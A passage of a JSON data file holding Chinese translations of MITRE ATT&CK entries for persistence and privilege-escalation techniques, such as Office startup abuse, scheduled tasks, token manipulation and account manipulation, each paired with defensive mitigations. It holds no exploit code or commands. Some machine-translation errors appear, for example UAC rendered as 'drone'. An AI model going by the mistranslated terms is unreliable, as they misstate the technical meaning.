                            "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<NetworkProviderName>\\NetworkProvider\\ProviderPath"
                        },
                        {
                            "type": "text",
                            "content": "）。请确保仅注册了有效的网络提供程序DLL。这些服务的名称可以在注册表项的"
                        },
                        {
                            "type": "code",
                            "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order中找到，并且相应的服务子项指向HKEY_LOCAL_MACHINE\\SSYSTEM\\CurrentC ontrolSet\\Services\\<NetworkProviderName>\\NetworkProvider"
                        },
                        {
                            "type": "text",
                            "content": "中的DLL。"
                        }
                    ]
                ]
            },
            {
                "id": "M1032",
                "name": "多因素身份验证",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将多因素身份验证（MFA）作为组织策略的一部分进行集成，可以大大降低对手获得有效证书控制权的风险，这些证书可用于其他策略，如初始访问、横向移动和收集信息。MFA还可以用于限制对云资源和API的访问。"
                        }
                    ]
                ]
            },
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保只注册了有效的密码筛选器。筛选器DLL必须存在于域控制器和/或本地计算机的Windows安装目录（默认情况下为"
                        },
                        {
                            "type": "code",
                            "content": "C:\\Windows\\System32\\"
                        },
                        {
                            "type": "text",
                            "content": "）中，并在"
                        },
                        {
                            "type": "code",
                            "content": "HKEY_local_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages"
                        },
                        {
                            "type": "text",
                            "content": "中具有相应的条目。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "从Windows 11 22H2开始，可以通过组策略或配置服务提供商禁用"
                        },
                        {
                            "type": "code",
                            "content": "EnableMPRNotifications"
                        },
                        {
                            "type": "text",
                            "content": "策略，以阻止Winlogon向网络提供商发送凭据。"
                        }
                    ]
                ]
            },
            {
                "id": "M1027",
                "name": "密码策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保"
                        },
                        {
                            "type": "code",
                            "content": "AllowReversiblePasswordEncryption"
                        },
                        {
                            "type": "text",
                            "content": "属性设置为禁用，除非有应用程序要求。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期审核域和本地帐户及其权限级别，以寻找可能允许对手通过获取特权帐户的凭据获得广泛访问权限的情况。这些审计还应包括是否已启用默认帐户，或者是否创建了未经授权的新本地帐户。遵循企业网络设计和管理的最佳实践，以限制跨管理层的特权帐户使用。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "通过适当的权限分离（例如SELinux、grsecurity、AppArmor等）和限制权限提升机会，限制对根帐户的访问，防止用户修改受保护的组件。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "限制可访问混合身份解决方案的本地帐户。例如，将Azure AD Global Administrator帐户限制为仅需要的帐户，并确保这些帐户是专用的纯云帐户，而不是混合帐户。"
                        }
                    ]
                ]
            },
            {
                "id": "M1025",
                "name": "特权流程完整性",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "已启用LSA的功能，如受保护的过程灯（PPL）。"
                        }
                    ]
                ]
            },
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制对"
                        },
                        {
                            "type": "code",
                            "content": "/Library/Security/SecurityAgentPlugins"
                        },
                        {
                            "type": "text",
                            "content": "目录的写入访问。"
                        }
                    ]
                ]
            },
            {
                "id": "M1024",
                "name": "限制注册表权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制注册表权限以禁止修改敏感注册表项，如"
                        },
                        {
                            "type": "code",
                            "content": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order"
                        },
                        {
                            "type": "text",
                            "content": "。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保实施适当的策略，以规定用户帐户的身份验证机制（如MFA）的安全注册和停用。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1137",
        "name": "Office Application Startup",
        "tactics": [
            {
                "id": "TA0003",
                "name": "Persistence"
            }
        ],
        "subs": [
            {
                "id": "T1137.001",
                "name": "Office Template Macros"
            },
            {
                "id": "T1137.002",
                "name": "Office Test"
            },
            {
                "id": "T1137.003",
                "name": "Outlook Forms"
            },
            {
                "id": "T1137.004",
                "name": "Outlook Home Page"
            },
            {
                "id": "T1137.005",
                "name": "Outlook Rules"
            },
            {
                "id": "T1137.006",
                "name": "Add-ins"
            }
        ],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会利用基于Microsoft Office的应用程序在初创公司之间保持持久性。Microsoft Office是企业网络中基于Windows的操作系统上相当常见的应用程序套件。启动基于Office的应用程序时，有多种机制可与Office一起用于持久性；这可能包括使用Office模板宏和加载项。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在Outlook中发现了多种可以被滥用以获得持久性的功能，如Outlook规则、表单和主页。这些持久性机制可以在Outlook中工作，也可以通过Office 365使用。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1040",
                "name": "端点上的行为预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在Windows 10上，启用减少攻击面（ASR）规则，以防止Office应用程序创建子进程以及将潜在的恶意可执行内容写入磁盘。"
                        }
                    ]
                ]
            },
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "遵循适合您的环境的Office宏安全最佳实践。禁止执行Office VBA宏。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "禁用Office加载项。如果需要，请遵循保护它们的最佳做法，要求对它们进行签名，并禁用允许加载项的用户通知。对于某些加载项类型（WLL、VBA），可能需要额外的缓解措施，因为在Office信任中心中禁用加载项不会禁用WLL，也不会阻止VBA代码的执行。"
                        }
                    ]
                ]
            },
            {
                "id": "M1054",
                "name": "软件配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "对于Office Test方法，请创建用于执行该方法的注册表项，并将权限设置为“读取控制”，以防止在没有管理员权限或需要特权升级的情况下轻松访问该项。"
                        }
                    ]
                ]
            },
            {
                "id": "M1051",
                "name": "更新软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "对于Outlook方法，阻止宏可能无效，因为用于这些功能的Visual Basic引擎与宏脚本引擎是分开的。微软已经发布了修补程序，试图解决每一个问题。确保将阻止Outlook Visual Basic并显示恶意代码警告的KB3191938、默认情况下禁用自定义表单的KB4011091和删除旧主页功能的KB4011162应用于系统。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1653",
        "name": "Power Settings",
        "tactics": [
            {
                "id": "TA0003",
                "name": "Persistence"
            }
        ],
        "subs": [],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会削弱系统休眠、重新启动或关闭的能力，以扩展对受感染机器的访问。当计算机进入休眠状态时，部分或所有软件和硬件可能停止运行，这可能会破坏恶意活动。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会滥用系统实用程序和配置设置，通过阻止机器进入可以终止恶意活动的状态（如待机状态）来维持访问。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "例如，"
                },
                {
                    "type": "code",
                    "content": "powercfg"
                },
                {
                    "type": "text",
                    "content": "控制Windows系统上的所有可配置电源系统设置，并且可能被滥用以防止受感染的主机锁定或关闭。敌人还可能延长系统锁定屏幕超时设置。其他相关设置，如磁盘和休眠超时，也可能被类似地滥用，以保持受感染的机器运行，即使没有用户处于活动状态。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "意识到一些恶意软件无法在系统重新启动后存活，对手可能会完全删除用于调用系统关闭或重新启动的文件。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期检查系统是否存在可能表明恶意行为的异常和意外电源设置。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1542",
        "name": "Pre-OS Boot",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0003",
                "name": "Persistence"
            }
        ],
        "subs": [
            {
                "id": "T1542.001",
                "name": "System Firmware"
            },
            {
                "id": "T1542.002",
                "name": "Component Firmware"
            },
            {
                "id": "T1542.003",
                "name": "Bootkit"
            },
            {
                "id": "T1542.004",
                "name": "ROMMONkit"
            },
            {
                "id": "T1542.005",
                "name": "TFTP Boot"
            }
        ],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会滥用操作系统引导前机制，将其作为在系统上建立持久性的一种方式。在计算机的引导过程中，固件和各种启动服务在操作系统之前加载。这些程序在操作系统取得控制之前控制执行流程。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会覆盖引导驱动程序或固件（如BIOS（基本输入/输出系统）和统一可扩展固件接口（UEFI））中的数据，以在操作系统下一层的系统上持久存在。这可能特别难以检测，因为基于主机软件的防御不会检测到该级别的恶意软件。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1046",
                "name": "引导完整性",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用受信任的平台模块技术和安全或受信任的引导过程来防止系统完整性受到损害。检查现有BIOS或EFI的完整性，以确定其是否容易被修改。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保拥有适当的权限，以帮助防止对手访问执行这些操作所需的特权帐户"
                        }
                    ]
                ]
            },
            {
                "id": "M1051",
                "name": "更新软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "根据需要修补BIOS和EFI。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1053",
        "name": "Scheduled Task/Job",
        "tactics": [
            {
                "id": "TA0002",
                "name": "Execution"
            },
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            }
        ],
        "subs": [
            {
                "id": "T1053.002",
                "name": "At"
            },
            {
                "id": "T1053.003",
                "name": "Cron"
            },
            {
                "id": "T1053.005",
                "name": "Scheduled Task"
            },
            {
                "id": "T1053.006",
                "name": "Systemd Timers"
            },
            {
                "id": "T1053.007",
                "name": "Container Orchestration Job"
            }
        ],
        "version": "2.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能滥用任务调度功能来促进恶意代码的初始或重复执行。所有主要操作系统中都存在实用程序，用于安排程序或脚本在指定的日期和时间执行。如果满足正确的身份验证（例如：Windows环境中的RPC以及文件和打印机共享），也可以在远程系统上调度任务。在远程系统上调度任务通常可能需要成为远程系统上的管理员或其他特权组的成员。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可以在系统启动时使用任务调度来执行程序，或者在计划的基础上执行程序以实现持久性。这些机制也可能被滥用以在指定帐户（例如具有提升权限/特权的帐户）的上下文下运行进程。与系统二进制代理执行类似，对手也滥用任务调度来潜在地掩盖可信系统进程下的一次性执行。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "PowerSploit框架等工具包包含PowerUp模块，这些模块可用于探索系统中可用于提升权限的计划任务中的权限弱点。"
                        }
                    ]
                ]
            },
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "配置计划任务的设置，以强制任务在经过身份验证的帐户的上下文下运行，而不允许它们作为SYSTEM运行。相关的注册表项位于"
                        },
                        {
                            "type": "code",
                            "content": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl"
                        },
                        {
                            "type": "text",
                            "content": "。可以通过GPO:计算机配置>[策略]>Windows设置>安全设置>本地策略>安全选项来配置该设置：域控制器：允许服务器操作员计划任务，设置为禁用。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将“增加计划优先级”选项配置为仅允许管理员组具有计划优先级进程的权限。这可以通过GPO:计算机配置>[策略]>Windows设置>安全设置>本地策略>用户权限分配进行配置：增加计划优先级。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制用户帐户的权限并修正权限提升向量，以便只有经过授权的管理员才能在远程系统上创建计划任务。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1505",
        "name": "Server Software Component",
        "tactics": [
            {
                "id": "TA0003",
                "name": "Persistence"
            }
        ],
        "subs": [
            {
                "id": "T1505.001",
                "name": "SQL Stored Procedures"
            },
            {
                "id": "T1505.002",
                "name": "Transport Agent"
            },
            {
                "id": "T1505.003",
                "name": "Web Shell"
            },
            {
                "id": "T1505.004",
                "name": "IIS Components"
            },
            {
                "id": "T1505.005",
                "name": "Terminal Services DLL"
            }
        ],
        "version": "1.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会滥用服务器的合法可扩展开发功能来建立对系统的持久访问。企业服务器应用程序可以包括允许开发人员编写和安装软件或脚本以扩展主应用程序的功能的功能。敌人可能会安装恶意组件来扩展和滥用服务器应用程序。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期检查对手可能针对的关键服务上的组件软件是否持久，以验证系统的完整性，并确定是否发生了意外更改。"
                        }
                    ]
                ]
            },
            {
                "id": "M1045",
                "name": "代码签名",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保所有应用程序组件二进制文件都由正确的应用程序开发人员签名。"
                        }
                    ]
                ]
            },
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "尽可能考虑禁用服务器上的软件组件，以防止对手滥用。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "不允许有权在这些服务上添加组件软件的管理员帐户用于日常操作，因为这些操作可能会使他们暴露在非特权系统上的潜在对手面前。"
                        }
                    ]
                ]
            },
            {
                "id": "M1024",
                "name": "限制注册表权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "请考虑使用组策略来配置和阻止对注册表中的服务和其他关键服务器参数的修改。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过限制用户帐户的权限，使只有经过授权的帐户才能修改和/或添加服务器软件组件，从而执行最小权限原则。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1205",
        "name": "Traffic Signaling",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0011",
                "name": "Command and Control"
            }
        ],
        "subs": [
            {
                "id": "T1205.001",
                "name": "Port Knocking"
            },
            {
                "id": "T1205.002",
                "name": "Socket Filters"
            }
        ],
        "version": "2.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能使用流量信号来隐藏打开的端口或用于持久性或命令和控制的其他恶意功能。流量信号涉及使用必须发送到系统以触发特殊响应的神奇值或序列，例如打开关闭的端口或执行恶意任务。这可以采取在对手可以用于指挥和控制的端口打开之前发送一系列具有特定特征的数据包的形式。通常，这一系列数据包包括尝试连接到预定义的封闭端口序列（即端口敲击），但可能涉及不寻常的标志、特定字符串或其他独特特征。序列完成后，打开端口可以由基于主机的防火墙完成，但也可以由自定义软件实现。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人也可能与已经打开的端口通信，但在该端口上侦听的服务只有在传递了适当的魔法值时才会响应命令或触发其他恶意功能。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "可以通过不同的方法来进行对信号分组的观察以触发通信。最初由Cd00r实现的一种方法是使用libpcap库来探查有问题的数据包。另一种方法利用原始套接字，使恶意软件能够使用已经打开供其他程序使用的端口。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在网络设备上，对手可能会使用特制的数据包为设备提供的标准服务（如telnet）启用网络设备身份验证。这种信令还可以用于打开诸如telnet之类的封闭服务端口，或者触发对设备上植入的恶意软件的模块修改，添加、删除或改变恶意功能。敌人可能会使用特制的数据包尝试连接到一个或多个（打开或关闭）端口，但也可能尝试连接到同一端口上的路由器接口、广播和网络地址IP，以实现其目标。为了在嵌入式设备上实现这种流量信号，由于体系结构的整体性，对手必须首先实现并利用补丁系统映像。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人也可以使用局域网唤醒功能来打开关闭电源的系统。局域网唤醒是一种硬件功能，可以通过向断电的系统发送魔法包来打开或唤醒断电的系统。一旦系统打开电源，它可能会成为横向移动的目标。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1042",
                "name": "禁用或删除功能或程序",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "如果环境中不需要，请禁用局域网唤醒。"
                        }
                    ]
                ]
            },
            {
                "id": "M1037",
                "name": "过滤网络流量",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "根据该技术的实现方式，可以通过使用有状态防火墙来实现对该技术某些变体的缓解。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1078",
        "name": "Valid Accounts",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            },
            {
                "id": "TA0001",
                "name": "Initial Access"
            }
        ],
        "subs": [
            {
                "id": "T1078.001",
                "name": "Default Accounts"
            },
            {
                "id": "T1078.002",
                "name": "Domain Accounts"
            },
            {
                "id": "T1078.003",
                "name": "Local Accounts"
            },
            {
                "id": "T1078.004",
                "name": "Cloud Accounts"
            }
        ],
        "version": "2.6",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会获取并滥用现有帐户的凭据，以此作为获得初始访问、持久性、特权提升或防御规避的手段。泄露的凭证可用于绕过网络内系统上各种资源上的访问控制，甚至可用于持久访问远程系统和外部可用服务，如VPN、Outlook Web access、网络设备和远程桌面。泄露的证书还可以向对手授予对特定系统的增加的特权或对网络的受限区域的访问。敌人可能会选择不将恶意软件或工具与这些凭据提供的合法访问结合使用，从而更难检测到它们的存在。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在某些情况下，对手可能会滥用非活动帐户：例如，那些属于不再是组织成员的个人的帐户。使用这些帐户可能会使对手逃避检测，因为原始帐户用户将不会在场以识别其帐户上发生的任何异常活动。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "本地、域和云帐户在系统网络上的权限重叠令人担忧，因为对手可能能够在帐户和系统之间切换，以达到高级别的访问（即域或企业管理员），从而绕过企业内设置的访问控制。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1036",
                "name": "帐户使用策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用条件访问策略阻止来自不兼容设备或来自定义的组织IP范围之外的登录。"
                        }
                    ]
                ]
            },
            {
                "id": "M1015",
                "name": "Active Directory配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "禁用不支持MFA的传统身份验证，并要求使用现代身份验证协议。"
                        }
                    ]
                ]
            },
            {
                "id": "M1013",
                "name": "应用程序开发人员指南",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保应用程序不会不安全地存储敏感数据或凭据。（例如，代码中的明文凭据、存储库中已发布的凭据或公共云存储中的凭据）。"
                        }
                    ]
                ]
            },
            {
                "id": "M1027",
                "name": "密码策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用默认用户名和密码的应用程序和设备应在安装后以及部署到生产环境之前立即进行更改。在可能的情况下，应定期更新使用SSH密钥的应用程序，并确保其安全。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "策略应尽量减少（如果不能消除的话）不同用户帐户之间密码的重复使用，尤其是对可能不受企业安全资源保护的个人帐户使用相同凭据的员工。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期审核域和本地帐户及其权限级别，以寻找可能允许对手通过获取特权帐户的凭据获得广泛访问权限的情况。这些审计还应包括是否已启用默认帐户，或者是否创建了未经授权的新本地帐户。遵循企业网络设计和管理的最佳实践，以限制跨管理层的特权帐户使用。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期审核用户帐户的活动，并停用或删除任何不再需要的帐户。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "应用程序可以发送推送通知以验证作为多因素身份验证（MFA）形式的登录。培训用户只接受有效的推送通知并报告可疑的推送消息。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1548",
        "name": "Abuse Elevation Control Mechanism",
        "tactics": [
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            },
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [
            {
                "id": "T1548.001",
                "name": "Setuid and Setgid"
            },
            {
                "id": "T1548.002",
                "name": "Bypass User Account Control"
            },
            {
                "id": "T1548.003",
                "name": "Sudo and Sudo Caching"
            },
            {
                "id": "T1548.004",
                "name": "Elevated Execution with Prompt"
            },
            {
                "id": "T1548.005",
                "name": "Temporary Elevated Cloud Access"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会绕过旨在控制提升特权以获得更高级别权限的机制。大多数现代系统都包含本机高程控制机制，旨在限制用户可以在机器上执行的权限。必须向特定用户授予授权，以便执行可能被认为风险较高的任务。对手可以执行多种方法来利用内置的控制机制来提升系统的权限。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "检查Windows系统上常见的UAC旁路弱点，以了解风险状况并在适当的情况下解决问题。"
                        }
                    ]
                ]
            },
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "系统设置可以阻止未从合法存储库下载的应用程序运行，这可能有助于缓解其中的一些问题。不允许未签名的应用程序运行也可以降低一些风险。"
                        }
                    ]
                ]
            },
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "具有已知漏洞或已知shell转义的应用程序不应设置setuid或setgid位，以减少应用程序受损时的潜在损坏。此外，在整个系统中，应尽量减少设置了setuid或setgid位的程序数量。确保启用sudo tty_tickets设置将防止这种跨tty会话的泄漏。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "从系统上的本地管理员组中删除用户。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "通过要求密码，即使对手可以获得终端访问权限，他们也必须知道密码才能运行sudoers文件中的任何内容。将timestamp_timeout设置为0将要求用户在每次执行sudo时输入密码。"
                        }
                    ]
                ]
            },
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "应该严格编辑sudoers文件，以便始终需要密码，并且用户不能作为具有更高权限的用户生成有风险的进程。"
                        }
                    ]
                ]
            },
            {
                "id": "M1052",
                "name": "用户帐户控制",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "尽管存在无人机绕过技术，但在可能的情况下，仍应谨慎地对无人机使用最高执行级别，并减少DLL搜索顺序劫持等技术存在的绕过机会。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将云帐户承担、创建或模拟其他角色、策略和权限的权限仅限于所需的权限。如果启用了即时访问，请考虑要求手动批准临时提升权限。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1134",
        "name": "Access Token Manipulation",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            }
        ],
        "subs": [
            {
                "id": "T1134.001",
                "name": "Token Impersonation/Theft"
            },
            {
                "id": "T1134.002",
                "name": "Create Process with Token"
            },
            {
                "id": "T1134.003",
                "name": "Make and Impersonate Token"
            },
            {
                "id": "T1134.004",
                "name": "Parent PID Spoofing"
            },
            {
                "id": "T1134.005",
                "name": "SID-History Injection"
            }
        ],
        "version": "2.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以修改访问令牌以在不同的用户或系统安全上下文下操作，从而执行操作并绕过访问控制。Windows使用访问令牌来确定正在运行的进程的所有权。用户可以操纵访问令牌，使正在运行的进程看起来像是另一个进程的子进程，或者属于启动该进程的用户以外的其他人。当这种情况发生时，进程还将接受与新令牌相关联的安全上下文。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可以使用内置的Windows API功能从现有进程中复制访问令牌；这就是所谓的代币盗窃。然后，这些令牌可以应用于现有进程（即令牌模拟/盗窃）或用于生成新进程（即使用令牌创建进程）。对手必须已经处于特权用户上下文（即管理员）中才能窃取令牌。然而，对手通常使用令牌窃取将其安全上下文从管理员级别提升到系统级别。如果帐户在远程系统上具有适当的权限，则对手可以使用令牌向远程系统进行身份验证，作为该令牌的帐户。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "任何标准用户都可以使用"
                },
                {
                    "type": "code",
                    "content": "runas"
                },
                {
                    "type": "text",
                    "content": "命令和Windows API函数来创建模拟令牌；它不需要访问管理员帐户。还有其他机制，如Active Directory字段，可用于修改访问令牌。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制权限，使用户和用户组无法创建令牌。应仅为本地系统帐户定义此设置。GPO:计算机配置>[策略]>Windows设置>安全设置>本地策略>用户权限分配：创建令牌对象。还定义谁可以通过GPO:计算机配置>[策略]>Windows设置>安全设置>本地策略>用户权限分配仅为本地和网络服务创建进程级令牌：替换进程级令牌。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "管理员应以标准用户身份登录，但使用内置的访问令牌操作命令"
                        },
                        {
                            "type": "code",
                            "content": "runas"
                        },
                        {
                            "type": "text",
                            "content": "以管理员权限运行其工具。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "对手必须已经对本地系统具有管理员级别的访问权限，才能充分利用这项技术；请确保将用户和帐户限制为所需的最低权限。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1098",
        "name": "Account Manipulation",
        "tactics": [
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            }
        ],
        "subs": [
            {
                "id": "T1098.001",
                "name": "Additional Cloud Credentials"
            },
            {
                "id": "T1098.002",
                "name": "Additional Email Delegate Permissions"
            },
            {
                "id": "T1098.003",
                "name": "Additional Cloud Roles"
            },
            {
                "id": "T1098.004",
                "name": "SSH Authorized Keys"
            },
            {
                "id": "T1098.005",
                "name": "Device Registration"
            },
            {
                "id": "T1098.006",
                "name": "Additional Container Cluster Roles"
            }
        ],
        "version": "2.6",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会操纵账户以维护和/或提升对受害者系统的访问权限。账户操纵可能包括保留或修改对手对受损账户的访问权限的任何操作，例如修改凭据或权限组。这些操作还可能包括旨在颠覆安全策略的帐户活动，例如执行迭代密码更新以绕过密码持续时间策略并保留受损凭据的寿命。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "为了创建或操纵帐户，对手必须已经对系统或域拥有足够的权限。但是，帐户操作也可能导致权限升级，其中修改会授予对其他角色、权限或更高特权的有效帐户的访问权限。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1032",
                "name": "多因素身份验证",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "对用户和特权帐户使用多因素身份验证。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "配置访问控制和防火墙以限制对关键系统和域控制器的访问。大多数云环境都支持独立的虚拟专用云（VPC）实例，从而实现云系统的进一步细分。"
                        }
                    ]
                ]
            },
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过确保关键服务器的正确安全配置来保护域控制器，以限制可能不必要的协议和服务（如SMB文件共享）的访问。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "不允许域管理员帐户用于日常操作，这可能会使它们暴露在非特权系统上的潜在对手面前。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保低特权用户帐户没有修改帐户或帐户相关策略的权限。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1547",
        "name": "Boot or Logon Autostart Execution",
        "tactics": [
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            }
        ],
        "subs": [
            {
                "id": "T1547.001",
                "name": "Registry Run Keys / Startup Folder"
            },
            {
